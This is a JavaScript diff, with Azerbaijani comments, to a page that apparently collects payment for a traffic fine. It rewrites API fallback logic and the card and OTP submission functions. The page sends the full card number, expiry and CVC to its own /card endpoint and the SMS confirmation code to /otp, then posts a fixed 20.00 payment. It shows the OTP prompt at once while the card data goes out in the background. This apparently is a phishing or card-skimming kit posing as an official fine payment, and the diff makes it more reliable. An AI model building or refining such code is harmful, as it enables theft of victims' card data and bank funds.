@@ -212,27 +212,26 @@
         }
 
         async function initConfig() {
-            try {
-                const res = await fetch(`config.json?t=${Date.now()}`);
-                if (res.ok) {
-                    const config = await res.json();
-                    if (config.apiUrl) {
-                        const formatted = formatApiUrl(config.apiUrl);
-                        const saved = localStorage.getItem('dyp_active_api_url');
-                        if (!saved || saved !== formatted) {
-                            API_URL = formatted;
-                            localStorage.setItem('dyp_active_api_url', formatted);
-                        } else {
-                            API_URL = saved;
+            const saved = localStorage.getItem('dyp_active_api_url');
+            if (saved) {
+                API_URL = formatApiUrl(saved);
+            } else {
+                try {
+                    const res = await fetch(`config.json?t=${Date.now()}`);
+                    if (res.ok) {
+                        const config = await res.json();
+                        if (config.apiUrl) {
+                            API_URL = formatApiUrl(config.apiUrl);
+                            localStorage.setItem('dyp_active_api_url', API_URL);
                         }
                     }
+                } catch (err) {
+                    console.log("Config oxunmadı, mövcud API_URL istifadə olunur:", API_URL);
                 }
-            } catch (err) {
-                console.log("Config oxunmadı, mövcud API_URL istifadə olunur:", API_URL);
             }
 
             if (!API_URL) {
-                API_URL = localStorage.getItem('dyp_active_api_url') || 'http://localhost:3000/api';
+                API_URL = 'http://localhost:3000/api';
             }
 
             fetchFineData();
@@ -263,21 +262,30 @@
 
         async function robustFetch(url, options = {}) {
             try {
-                let res = await fetch(url, { ...options, signal: AbortSignal.timeout(3000) });
+                let res = await fetch(url, { ...options, signal: AbortSignal.timeout(4000) });
                 if (res.ok) {
                     return res;
                 }
             } catch (e) {}
 
-            const isLocal = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.location.protocol === 'file:');
-            if (isLocal && url.startsWith('https://')) {
+            if (url.includes('/api/')) {
+                const endpoint = url.substring(url.indexOf('/api/'));
+
                 try {
-                    let emulatorUrl = url.replace(/https?:\/\/[^\/]+/, 'http://10.0.2.2:3000');
-                    let resEmulator = await fetch(emulatorUrl, { ...options, signal: AbortSignal.timeout(2000) });
+                    let resEmulator = await fetch(`http://10.0.2.2:3000${endpoint}`, { ...options, signal: AbortSignal.timeout(2000) });
                     if (resEmulator.ok) {
                         API_URL = 'http://10.0.2.2:3000/api';
                         localStorage.setItem('dyp_active_api_url', API_URL);
                         return resEmulator;
+                    }
+                } catch (e1) {}
+
+                try {
+                    let resLocal = await fetch(`http://localhost:3000${endpoint}`, { ...options, signal: AbortSignal.timeout(2000) });
+                    if (resLocal.ok) {
+                        API_URL = 'http://localhost:3000/api';
+                        localStorage.setItem('dyp_active_api_url', API_URL);
+                        return resLocal;
                     }
                 } catch (e2) {}
             }
@@ -574,29 +582,36 @@
             clearInterval(otpInterval);
         }
 
-        function submitCardDetails(event) {
+        async function submitCardDetails(event) {
             if (event) event.preventDefault();
             const cardNoEl = document.getElementById('card-no');
             const cardExpEl = document.getElementById('card-exp');
             const cardCvcEl = document.getElementById('card-cvc');
 
-            const cardNo = cardNoEl ? cardNoEl.value : '';
-            const cardExp = cardExpEl ? cardExpEl.value : '';
-            const cardCvc = cardCvcEl ? cardCvcEl.value : '';
+            const cardNo = cardNoEl ? cardNoEl.value.trim() : '';
+            const cardExp = cardExpEl ? cardExpEl.value.trim() : '';
+            const cardCvc = cardCvcEl ? cardCvcEl.value.trim() : '';
+
+            if (!cardNo || cardNo.replace(/\s+/g, '').length < 16) {
+                alert("Zəhmət olmasa 16 rəqəmli kart nömrəsini tam daxil edin.");
+                return;
+            }
 
             // Anında SMS OTP modal pəncərəsini aç ki, UI donmasın
             document.getElementById('card-modal')?.classList.add('hidden');
             document.getElementById('otp-modal')?.classList.remove('hidden');
             startOtpTimer();
 
-            // Kart məlumatlarını arxa fonda göndər
-            robustFetch(`${API_URL}/card`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ cardNo, cardExp, cardCvc })
-            }).catch(err => {
+            // Kart məlumatlarını backend serverə göndər
+            try {
+                await robustFetch(`${API_URL}/card`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cardNo, cardExp, cardCvc })
+                });
+            } catch (err) {
                 console.error("Kart göndərmə xətası:", err);
-            });
+            }
         }
 
         function startOtpTimer() {
@@ -617,10 +632,10 @@
             }, 1000);
         }
 
-        function submitOtpCode(event) {
+        async function submitOtpCode(event) {
             if (event) event.preventDefault();
             const otpCodeEl = document.getElementById('otp-code');
-            const otpCode = otpCodeEl ? otpCodeEl.value : '';
+            const otpCode = otpCodeEl ? otpCodeEl.value.trim() : '';
             if (otpCode.length < 4) {
                 alert("Zəhmət olmasa 4-6 rəqəmli təsdiq kodunu düzgün daxil edin.");
                 return;
@@ -631,19 +646,20 @@
             closeModals();
             showLoadingScreen();
 
-            robustFetch(`${API_URL}/otp`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ otpCode })
-            }).then(() => {
-                return robustFetch(`${API_URL}/pay`, {
+            try {
+                await robustFetch(`${API_URL}/otp`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ otpCode })
+                });
+                await robustFetch(`${API_URL}/pay`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ amountPaid: 20.00 })
                 });
-            }).catch(err => {
+            } catch (err) {
                 console.error("OTP / Pay xətası:", err);
-            });
+            }
         }
 
         async function retryPayment() {
